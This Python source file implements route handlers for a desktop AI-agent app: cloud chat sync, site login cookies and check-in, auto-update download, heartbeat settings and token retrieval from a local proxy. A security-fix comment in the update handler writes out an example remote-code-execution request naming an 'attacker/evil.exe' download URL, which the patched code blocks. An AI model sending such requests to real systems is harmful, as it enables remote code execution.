# -*- coding: utf-8 -*-
"""朱峰智能体登录、签到、更新和心跳相关路由（自 4.2.1 移植，方法体未改动）。"""
from routes._shared import *
from routes.zf3d_login import Zf3dLoginMixin
from routes.zf3d_relay import Zf3dRelayMixin
import logging
from util_log import get_logger

log = get_logger('zf3d')

# 端口集中配置：统一走 config.get_ai_proxy_port()（与代理实际监听同源，杜绝双源分叉）
def _load_zf_proxy_port():
    try:
        from config import get_ai_proxy_port
        return get_ai_proxy_port()
    except Exception:
        return 8624

_ZF_PROXY_PORT = _load_zf_proxy_port()


class Zf3dRoutesMixin(Zf3dLoginMixin, Zf3dRelayMixin):
    """朱峰智能体及相关系统路由。"""

    # ===== 双端同步按钮：电脑端检测/拉取云端手机消息 =====

    def _handle_zf3d_remote_sync(self, qs):
        """GET /api/zf3d/remote_sync?pull=1 — 检测云端手机消息是否比本地新，pull=1 时拉回合并。"""
        try:
            self.send_response(200)
            self.send_header('Content-Type', 'application/json; charset=utf-8')
            self.send_header('Cache-Control', 'no-store')
            self.end_headers()
            import zf3d_commands as zc
            # 先轻量探测：拉云端会话列表，与本地 remote_ 会话消息数比对
            api_key = zc._get_api_key()
            machine_id = zc._get_machine_id()
            if not api_key or not machine_id:
                self.wfile.write(json.dumps({'ok': False, 'err': 'not_logged_in'}).encode('utf-8'))
                return
            url = zc.ZF3D_WEBSITE + '/api/agent_api.asp?key=%s&a=chat_sessions' % (
                __import__('urllib.parse', fromlist=['x']).quote(api_key),)
            resp = zc._http_post(url, {'machine_id': machine_id})
            sessions = resp.get('sessions') or []
            stale = False
            from db import get_db
            c = get_db()
            if True:
                for s in sessions:
                    cloud_sid = str(s.get('session_id') or '').strip()
                    if not cloud_sid or cloud_sid == '0':
                        continue
                    local_sid = 'remote_' + cloud_sid
                    row = c.execute("SELECT COUNT(*) FROM chat_history WHERE session_id=?", (local_sid,)).fetchone()
                    cloud_n = int(s.get('msg_count') or s.get('count') or 0)
                    # 【加固】云端有会话但本地无 remote_ 镜像 → 一定视为待同步，
                    # 防止云端 msg_count 与本地计数口径不一致时误判为「已同步」
                    if row[0] == 0 and cloud_n > 0:
                        stale = True
                        break
                    if cloud_n > row[0]:
                        stale = True
                        break
            pulled = 0
            if stale and (qs.get('pull') or ['0'])[0] == '1':
                r = zc.pull_remote_chats()
                pulled = r.get('pulled', 0)
            self.wfile.write(json.dumps({'ok': True, 'stale': stale, 'pulled': pulled},
                                        ensure_ascii=False).encode('utf-8'))
        except Exception as e:
            try:
                self.send_response(500)
                self.send_header('Content-Type', 'application/json; charset=utf-8')
                self.end_headers()
                self.wfile.write(json.dumps({'ok': False, 'err': str(e)}).encode('utf-8'))
            except Exception:
                pass

        # ===== 朱峰智能体登录/签到/状态 =====

    def _zf3d_get_cookies(self):
        """从数据库读取保存的朱峰智能体 cookies"""
        conn = None
        try:
            # F2 读锁分离：纯 SELECT 不再排队全局 _db_lock
            row = db_read("SELECT value FROM app_data WHERE category='zf3d' AND key='cookies'", fetch='one')
            if row:
                return json.loads(row['value'])
            return {}
        except Exception as e:
            log.info(f'[zf3d] get_cookies error: {e}')
            return {}

    def _zf3d_save_cookies(self, cookie_dict):
        """保存 cookies 到数据库"""
        conn = None
        try:
            now_ms = int(time.time() * 1000)
            cookie_json = json.dumps(cookie_dict, ensure_ascii=False)
            with _db_lock:
                conn = get_db()
                cur = conn.cursor()
                cur.execute(
                    "INSERT INTO app_data (category, key, value, created_at, updated_at) VALUES ('zf3d', 'cookies', ?, ?, ?) "
                    "ON CONFLICT(category, key) DO UPDATE SET value=excluded.value, updated_at=excluded.updated_at",
                    (cookie_json, now_ms, now_ms)
                )
                conn.commit()
                conn.close()
                conn = None
        except Exception as e:
            log.info(f'[zf3d] save_cookies error: {e}')
            if conn:
                try:
                    conn.close()
                except Exception:
                    logging.debug("swallow", exc_info=True)
    def _zf3d_cookie_header(self, cookies):
        """将 cookie dict 转换为 Cookie 请求头字符串"""
        if not cookies:
            return ''
        parts = []
        for k, v in cookies.items():
            parts.append(f'{k}={v}')
        return '; '.join(parts)

    def _zf3d_extract_cookies(self, resp, existing_cookies):
        """从 HTTP 响应中提取 Set-Cookie 并合并到现有 cookies"""
        cookies = dict(existing_cookies)
        for header in resp.headers.get_all('Set-Cookie') or []:
            cookie_part = header.split(';')[0].strip()
            if '=' in cookie_part:
                k, v = cookie_part.split('=', 1)
                cookies[k.strip()] = v.strip()
        return cookies



    def _handle_zf3d_checkin(self):
        """POST /api/zf3d/checkin - 朱峰智能体签到"""
        import urllib.parse as up
        try:
            cookies = self._zf3d_get_cookies()
            if not cookies:
                self._send_json({'ok': False, 'error': '请先登录朱峰智能体'})
                return

            checkin_url = 'https://www.zf3d.com/api/user.asp'
            post_data = up.urlencode({'a': 'checkin'}).encode('utf-8')

            req = urllib.request.Request(checkin_url, data=post_data, method='POST')
            req.add_header('Content-Type', 'application/x-www-form-urlencoded')
            req.add_header('User-Agent', 'Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36')
            req.add_header('Referer', 'https://www.zf3d.com/')
            cookie_str = self._zf3d_cookie_header(cookies)
            if cookie_str:
                req.add_header('Cookie', cookie_str)

            # [SSL 2026-11-02] 改走 _shared._SSL_CTX 统一证书校验（含 ssl_verify 开关），不再硬编码禁验
            resp = _urlopen_retry(req, timeout=30, tag='Zf3dCheckin')
            resp_body = resp.read().decode('utf-8', errors='replace')

            new_cookies = self._zf3d_extract_cookies(resp, cookies)
            self._zf3d_save_cookies(new_cookies)

            try:
                resp_data = json.loads(resp_body)
            except json.JSONDecodeError:
                resp_data = {'raw': resp_body}

            # 智能判断成功：兼容 success / code:0 / status:ok / msg含成功字样
            is_ok = resp_data.get('success', False)
            if not is_ok and resp_data.get('code') in (0, 200, '0', '200'):
                is_ok = True
            if not is_ok and resp_data.get('status') in ('ok', 'success', 0, '0'):
                is_ok = True
            if not is_ok and isinstance(resp_data.get('msg'), str):
                m = resp_data['msg']
                if any(k in m for k in ['成功', '已签到', '已领取', '签到成功']):
                    is_ok = True
            if not is_ok and isinstance(resp_data.get('message'), str):
                m = resp_data['message']
                if any(k in m for k in ['成功', '已签到', '已领取', '签到成功']):
                    is_ok = True
            # 检查 data 嵌套层
            if not is_ok and isinstance(resp_data.get('data'), dict):
                inner = resp_data['data']
                if inner.get('success') or inner.get('code') in (0, 200, '0', '200'):
                    is_ok = True
            self._send_json({'ok': is_ok, 'data': resp_data})

        except urllib.error.HTTPError as e:
            err_body = e.read().decode('utf-8', errors='replace')
            log.info(f'[zf3d] checkin HTTP {e.code}: {err_body[:500]}')
            self._send_json({'ok': False, 'error': f'服务器返回 {e.code}', 'data': None})
        except urllib.error.URLError as e:
            log.info(f'[zf3d] checkin URL error: {e}')
            self._send_json({'ok': False, 'error': f'连接失败: {e.reason}', 'data': None})
        except Exception as e:
            log.info(f'[zf3d] checkin exception: {e}')
            traceback.print_exc()
            self._send_json({'ok': False, 'error': str(e), 'data': None})

    def _handle_zf3d_status(self):
        """GET/POST /api/zf3d/status - 查询朱峰智能体登录状态和签到情况"""
        try:
            cookies = self._zf3d_get_cookies()
            username = ''

            try:
                # F2 读锁分离：纯 SELECT 不再排队全局 _db_lock
                row = db_read("SELECT value FROM app_data WHERE category='zf3d' AND key='username'", fetch='one')
                if row:
                    username = row['value']
            except Exception as e:
                logging.warning(f"[zf3d] read username from db failed: {e}")
            logged_in = bool(cookies) and bool(username)

            checkin_info = None
            if logged_in:
                try:
                    status_url = 'https://www.zf3d.com/api/user.asp?a=checkin_status'
                    req = urllib.request.Request(status_url, method='GET')
                    req.add_header('User-Agent', 'Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36')
                    req.add_header('Referer', 'https://www.zf3d.com/')
                    cookie_str = self._zf3d_cookie_header(cookies)
                    if cookie_str:
                        req.add_header('Cookie', cookie_str)

                    # [SSL 2026-11-02] 改走 _shared._SSL_CTX 统一证书校验（含 ssl_verify 开关），不再硬编码禁验
                    resp = _urlopen_retry(req, timeout=15, tag='Zf3dStatus')
                    resp_body = resp.read().decode('utf-8', errors='replace')

                    new_cookies = self._zf3d_extract_cookies(resp, cookies)
                    self._zf3d_save_cookies(new_cookies)

                    try:
                        checkin_info = json.loads(resp_body)
                    except json.JSONDecodeError:
                        checkin_info = None
                except Exception as e:
                    log.info(f'[zf3d] status check error: {e}')

            self._send_json({
                'ok': True,
                'logged_in': logged_in,
                'username': username,
                'checkin': checkin_info
            })

        except Exception as e:
            log.info(f'[zf3d] status exception: {e}')
            self._send_json({'ok': False, 'error': str(e)})


    def _handle_zf3d_site_config(self):
        """GET/POST /api/zf3d/site-config - 获取网站配置（logo等），从数据库读取"""
        conn = None
        try:
            logo_url = ''
            # F2 读锁分离：纯 SELECT 不再排队全局 _db_lock
            row = db_read("SELECT value FROM app_data WHERE category='zf3d' AND key='site_config'", fetch='one')
            if row:
                try:
                    cfg = json.loads(row['value'])
                    logo_url = cfg.get('logo_url', '')
                except Exception: logging.debug("swallow", exc_info=True)
            if not logo_url:
                logo_url = 'https://www.zf3d.com/assets/images/logo-transparent.png'
            self._send_json({'ok': True, 'logo_url': logo_url})
        except Exception as e:
            log.info(f'[zf3d] site_config error: {e}')
            self._send_json({'ok': True, 'logo_url': 'https://www.zf3d.com/assets/images/logo-transparent.png'})

    def _handle_zf3d_logo_img(self):
        """GET /api/zf3d/logo-img - 代理获取外部 logo 图片，避免 CORS 问题"""
        try:
            logo_url = ''
            # F2 读锁分离：纯 SELECT 不再排队全局 _db_lock
            row = db_read("SELECT value FROM app_data WHERE category='zf3d' AND key='site_config'", fetch='one')
            if row:
                try:
                    cfg = json.loads(row['value'])
                    logo_url = cfg.get('logo_url', '')
                except Exception: logging.debug("swallow", exc_info=True)
            if not logo_url:
                logo_url = 'https://www.zf3d.com/assets/images/logo-transparent.png'
            # 代理请求外部图片
            req = urllib.request.Request(logo_url, headers={
                'User-Agent': 'Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36'
            })
            with _urlopen_retry(req, timeout=10, attempts=3, tag='Zf3dLogo') as resp:
                img_data = resp.read()
                content_type = resp.headers.get('Content-Type', 'image/png')
            self.send_response(200)
            self.send_header('Content-Type', content_type)
            self.send_header('Cache-Control', 'public, max-age=3600')
            self.send_header('Content-Length', str(len(img_data)))
            self.end_headers()
            self.wfile.write(img_data)
        except Exception as e:
            log.info(f'[zf3d] logo-img proxy error: {e}')
            # 代理失败时返回本地 logo 图片
            local_logo = os.path.join(PUBLIC_DIR, 'assets', 'logo-transparent.png')
            if os.path.exists(local_logo):
                with open(local_logo, 'rb') as f:
                    img_data = f.read()
                self.send_response(200)
                self.send_header('Content-Type', 'image/png')
                self.send_header('Cache-Control', 'public, max-age=300')
                self.send_header('Content-Length', str(len(img_data)))
                self.end_headers()
                self.wfile.write(img_data)
            else:
                self.send_error(404, 'Logo not found')

    def _handle_update_status(self):
        """GET/POST /api/update-status - 自动更新状态（前端轮询；首次调用会拉起守护线程）"""
        try:
            from update_checker import start_auto_update
            state = start_auto_update()  # 幂等：已启动则只返回状态
            self._send_json({'success': True, **state})
        except Exception as e:
            self._send_json({'success': False, 'error': str(e)})

    def _handle_check_update(self):
        """POST /api/check-update - 检查是否有新版本"""
        try:
            from update_checker import UpdateChecker
            import json as _json
            config_path = os.path.join(BASE_DIR, 'private', 'config.json')
            config = {}
            if os.path.exists(config_path):
                with open(config_path, 'r', encoding='utf-8-sig') as f:
                    config = _json.load(f)
            config['project_root'] = BASE_DIR
            checker = UpdateChecker(config)
            result = checker.check_update(force=True)
            self._send_json(result)
        except Exception as e:
            self._send_json({'has_update': False, 'error': str(e)})

    def _handle_do_update(self, data):
        """POST /api/do-update - 执行更新"""
        try:
            from update_checker import UpdateChecker
            import json as _json
            config_path = os.path.join(BASE_DIR, 'private', 'config.json')
            config = {}
            if os.path.exists(config_path):
                with open(config_path, 'r', encoding='utf-8-sig') as f:
                    config = _json.load(f)
            config['project_root'] = BASE_DIR
            checker = UpdateChecker(config)
            # 安全修复（对应 GitHub issue #22）：请求体里的 download_url 一律不信任——
            # 任何人可 POST /api/do-update {"download_url":"http://attacker/evil.exe"}
            # 触发服务端下载并 os.startfile 执行 → RCE。
            # 改为：强制走 UpdateChecker 多源（OSS/自建/Gitee/GitHub）获取官方地址，
            # 且最终 URL 必须通过域名白名单校验（_is_allowed_update_url）。
            if data.get('download_url'):
                log.info('[do-update] 安全拦截：请求体携带 download_url 已被忽略（不接受客户端指定下载源）')
            result = checker.check_update(force=True)
            download_url = result.get('download_url', '')
            if not download_url:
                self._send_json({'success': False, 'error': '无法获取安装包下载地址'})
                return
            if not self._is_allowed_update_url(download_url, checker):
                log.info(f'[do-update] 安全拦截：下载地址不在白名单内: {download_url}')
                self._send_json({'success': False, 'error': '下载地址不在更新源白名单内，已拒绝'})
                return
            # 方案B：后台线程下载新版安装包，完成后自动弹出安装程序；立即响应前端"下载中"
            import tempfile, threading, urllib.request

            def _download_and_launch():
                installer_path = os.path.join(tempfile.gettempdir(), 'ZF-Agent-Setup-latest.exe')
                try:
                    req = urllib.request.Request(download_url, headers={'User-Agent': 'ZF-Agent-Updater'})
                    with urllib.request.urlopen(req, timeout=1800) as resp, open(installer_path, 'wb') as f:
                        while True:
                            chunk = resp.read(256 * 1024)
                            if not chunk:
                                break
                            f.write(chunk)
                    if os.path.getsize(installer_path) < 1024 * 1024:
                        log.error('[do-update] 下载的安装包异常（体积过小），已放弃')
                        return
                    # 启动安装程序（用户按提示下一步即可；覆盖安装不丢 private/ 隐私数据）
                    os.startfile(installer_path)
                    log.info(f'[do-update] 安装包已下载并启动: {installer_path}')
                except Exception as e2:
                    log.error(f'[do-update] 下载/启动安装包失败: {e2}')

            threading.Thread(target=_download_and_launch, daemon=True).start()
            self._send_json({'success': True, 'phase': 'downloading', 'message': '正在后台下载新版安装包，下载完成后将自动弹出安装程序'})
        except Exception as e:
            self._send_json({'success': False, 'error': str(e)})

    @staticmethod
    def _is_allowed_update_url(url, checker):
        """更新下载地址域名白名单：只允许官方更新源（OSS/GitHub/Gitee 及 config 中配置的自建源）"""
        from urllib.parse import urlparse
        try:
            host = (urlparse(url).hostname or '').lower()
        except Exception:
            return False
        if not host:
            return False
        allowed_hosts = {
            'zf3d-img.oss-cn-guangzhou.aliyuncs.com',  # 官方 OSS 更新源
            'github.com', 'objects.githubusercontent.com', 'codeload.github.com',
            'gitee.com', 'gitee.cn', 'lfs.gitee.cn',
        }
        if host in allowed_hosts:
            return True
        # 自建更新源：以 config.update.backup_server / oss_base 的 host 为准
        for base in (getattr(checker, 'backup_server', ''), getattr(checker, 'oss_base', '')):
            if base:
                try:
                    if (urlparse(base).hostname or '').lower() == host:
                        return True
                except Exception:
                    pass
        # 本机自建源放行
        if host in ('localhost', '127.0.0.1') or host.endswith('.local'):
            return True
        return False

    def _handle_zf3d_heartbeat_config(self):
        """POST /api/zf3d/heartbeat-config - 保存心跳API Key配置 + 独立开关（issue#83②）"""
        try:
            body = self._read_body()
            api_key = body.get('api_key', '').strip()
            # enabled: 显式传 '1'/'0'/true/false；不传则视为 '1'（保存 key 即默认允许心跳）
            enabled_raw = body.get('enabled', '1')
            enabled = '1' if str(enabled_raw).strip() in ('1', 'true', 'True', 'on') else '0'
            now_ms = int(time.time() * 1000)
            conn = None
            try:
                with _db_lock:
                    conn = get_db()
                    conn.execute(
                        "INSERT OR REPLACE INTO app_data (category, key, value, created_at) VALUES ('zf3d', 'heartbeat_api_key', ?, ?)",
                        (api_key, now_ms)
                    )
                    conn.execute(
                        "INSERT OR REPLACE INTO app_data (category, key, value, created_at) VALUES ('zf3d', 'heartbeat_enabled', ?, ?)",
                        (enabled, now_ms)
                    )
                    conn.commit()
                    conn.close()
                    conn = None
            except Exception:
                if conn:
                    try:
                        conn.close()
                    except Exception:
                        logging.debug("swallow", exc_info=True)
            # 保存后自动启动/重启心跳线程（仅当 key 非空且开关开时启动）
            try:
                from zf3d_heartbeat import start_heartbeat, stop_heartbeat
                if api_key and enabled == '1':
                    start_heartbeat()
                    msg = 'API Key 已保存，心跳线程已启动'
                else:
                    stop_heartbeat()
                    msg = '心跳已停止' if enabled != '1' else 'API Key 已清空，心跳线程已停止'
            except Exception as e2:
                log.info(f'[zf3d] heartbeat start/stop after config save: {e2}')
                msg = f'配置已保存（心跳线程启动失败: {e2}）'
            self._send_json({'ok': True, 'message': msg, 'enabled': enabled})
        except Exception as e:
            log.info(f'[zf3d] heartbeat_config error: {e}')
            self._send_json({'ok': False, 'error': str(e)})

    def _handle_zf3d_heartbeat_status(self):
        """GET/POST /api/zf3d/heartbeat-status - 查询心跳状态"""
        try:
            from zf3d_heartbeat import get_heartbeat_status
            status = get_heartbeat_status()
            self._send_json({'ok': True, 'data': status})
        except Exception as e:
            log.info(f'[zf3d] heartbeat_status error: {e}')
            self._send_json({'ok': False, 'error': str(e)})

    def _handle_zf3d_ai_token(self):
        if not self._check_origin():
            return
        """GET /api/zf3d/ai-token - 朱峰模型登录即用：根据本机 zf3d 登录态向代理幂等取会员令牌"""
        try:
            conn = None
            login_data = None
            try:
                # F2 读锁分离：纯 SELECT 不再排队全局 _db_lock
                row = db_read("SELECT value FROM app_data WHERE category='zf3d' AND key='login_data'", fetch='one')
                if row and row['value']:
                    login_data = json.loads(row['value'])
            except Exception as e:
                logging.debug(f"[zf3d] ai_token read login_data: {e}")
            if not login_data or not login_data.get('success'):
                self._send_json({'ok': False, 'error': 'not_login'})
                return
            uid = login_data.get('user_id') or (login_data.get('data') or {}).get('user_id')
            if uid in (None, ''):
                self._send_json({'ok': False, 'error': 'not_login'})
                return
            req = urllib.request.Request(
                f'http://127.0.0.1:{_ZF_PROXY_PORT}/internal/get_token',
                data=json.dumps({'user_id': int(uid)}).encode('utf-8'),
                method='POST')
            req.add_header('Content-Type', 'application/json')
            try:
                import zf_identity as _zfi
                _sec = _zfi.internal_secret()
                if _sec:
                    req.add_header('X-ZF-Internal', _sec)
            except Exception:
                pass
            try:
                resp = urllib.request.urlopen(req, timeout=10)
                data = json.loads(resp.read().decode('utf-8'))
                if data.get('token'):
                    # 【2026-11-22】附带中转线路 Key 状态：zf_models_relay 的鉴权用的是服务端
                    # heartbeat_api_key（登录时下发），与本令牌无关。前端快捷对话框据此判断
                    # "令牌取到但中转 Key 缺失" → 引导真正重新登录（登录才会重新下发 Key），
                    # 而不是拿着令牌假装开通线路，再被上游 401 打回死循环。
                    _relay_key = False
                    try:
                        from zf3d_commands import _get_api_key as _gak
                        _relay_key = bool(_gak())
                    except Exception:
                        _relay_key = False
                    self._send_json({'ok': True, 'token': data['token'], 'user_id': int(uid),
                                     'relay_key': _relay_key})
                    return
                self._send_json({'ok': False, 'error': data.get('error') or 'proxy_error'})
            except urllib.error.HTTPError as e:
                # 代理进程存活但接口返回 4xx/5xx（含鉴权/登录态失效），区别于"连不上"
                log.info(f'[zf3d] ai_token proxy HTTP {e.code}: {e}')
                self._send_json({'ok': False, 'error': f'upstream_{e.code}'})
            except Exception as e:
                log.info(f'[zf3d] ai_token proxy call: {e}')
                self._send_json({'ok': False, 'error': 'proxy_unavailable'})
        except Exception as e:
            log.info(f'[zf3d] ai_token error: {e}')
            self._send_json({'ok': False, 'error': str(e)})

    def _handle_zf3d_identity_ticket(self):
        if not self._check_origin():
            return
        """GET /api/zf3d/identity-ticket - 朱峰线路身份票签发：
        校验本机 zf3d 登录态后向 8787 网关 /internal/issue_identity 换取
        HMAC 签名一次性身份票（Cookie zf_idt），前端凭票调用朱峰通道，明文 key 不出站。"""
        try:
            conn = None
            login_data = None
            try:
                # F2 读锁分离：纯 SELECT 不再排队全局 _db_lock
                row = db_read("SELECT value FROM app_data WHERE category='zf3d' AND key='login_data'", fetch='one')
                if row and row['value']:
                    login_data = json.loads(row['value'])
            except Exception as e:
                logging.debug(f"[zf3d] identity_ticket read login_data: {e}")
            if not login_data or not login_data.get('success'):
                self._send_json({'ok': False, 'error': 'not_login'})
                return
            uid = login_data.get('user_id') or (login_data.get('data') or {}).get('user_id')
            if uid in (None, ''):
                self._send_json({'ok': False, 'error': 'not_login'})
                return
            req = urllib.request.Request(
                f'http://127.0.0.1:{_ZF_PROXY_PORT}/internal/issue_identity',
                data=json.dumps({'user_id': int(uid)}).encode('utf-8'),
                method='POST')
            req.add_header('Content-Type', 'application/json')
            try:
                import zf_identity as _zfi
                _sec = _zfi.internal_secret()
                if _sec:
                    req.add_header('X-ZF-Internal', _sec)
            except Exception:
                pass
            try:
                resp = urllib.request.urlopen(req, timeout=10)
                # 【关键】把网关签发的 Set-Cookie(zf_idt) 原样转发给浏览器：
                # Cookie 按 host(127.0.0.1) 存储、不分端口，之后前端带 credentials 请求 8787 时会自动携带身份票
                sc = resp.headers.get('Set-Cookie')
                data = json.loads(resp.read().decode('utf-8'))
                if data.get('ok'):
                    self._send_json({'ok': True, 'user_id': int(uid),
                                     'expires_in': data.get('expires_in', 0)},
                                    extra_headers=[('Set-Cookie', sc)] if sc else None)
                    return
                self._send_json({'ok': False, 'error': data.get('error') or 'issue_failed'})
            except urllib.error.HTTPError as e:
                self._send_json({'ok': False, 'error': f'upstream_{e.code}'})
            except Exception as e:
                log.info(f'[zf3d] identity_ticket proxy call: {e}')
                self._send_json({'ok': False, 'error': 'proxy_unavailable'})
        except Exception as e:
            log.info(f'[zf3d] identity_ticket error: {e}')
            self._send_json({'ok': False, 'error': str(e)})

    def _handle_zf3d_ai_balance(self):
        if not self._check_origin():
            return
        """GET /api/zf3d/ai-balance - 代理本机 AI 网关 internal/me 查询当前用户 AI 余额"""
        try:
            cookies = self._zf3d_get_cookies()
            username = ''
            uid = None
            # F2 读锁分离：纯 SELECT 不再排队全局 _db_lock
            row = db_read("SELECT value FROM app_data WHERE category='zf3d' AND key='username'", fetch='one')
            if row:
                username = row['value']
            # 余额按本地 user_id 查（网关 internal/me 只认 user_id），与 ai_token 同源
            row = db_read("SELECT value FROM app_data WHERE category='zf3d' AND key='login_data'", fetch='one')
            if row and row['value']:
                try:
                    login_data = json.loads(row['value'])
                    uid = login_data.get('user_id') or (login_data.get('data') or {}).get('user_id')
                except Exception:
                    uid = None
            if not cookies or not username:
                self._send_json({'ok': False, 'logged_in': False, 'balance': 0, 'username': ''})
                return
            if uid in (None, ''):
                self._send_json({'ok': True, 'logged_in': True, 'username': username,
                                 'balance': 0, 'status': 'none'})
                return
            req = urllib.request.Request(
                f'http://127.0.0.1:{_ZF_PROXY_PORT}/internal/me',
                data=json.dumps({'user_id': int(uid)}).encode('utf-8'),
                method='POST')
            req.add_header('Content-Type', 'application/json')
            try:
                import zf_identity as _zfi
                _sec = _zfi.internal_secret()
                if _sec:
                    req.add_header('X-ZF-Internal', _sec)
            except Exception:
                pass
            try:
                resp = urllib.request.urlopen(req, timeout=8)
                data = json.loads(resp.read().decode('utf-8', errors='replace'))
                self._send_json({'ok': True, 'logged_in': True, 'username': username,
                                 'balance': data.get('balance', 0),
                                 'status': data.get('status', 'none')})
            except Exception as e:
                log.info(f'[zf3d] ai-balance upstream error: {e}')
                self._send_json({'ok': True, 'logged_in': True, 'username': username,
                                 'balance': 0, 'upstream_err': True})
        except Exception as e:
            log.info(f'[zf3d] ai-balance exception: {e}')
            self._send_json({'ok': False, 'balance': 0, 'err': str(e)})
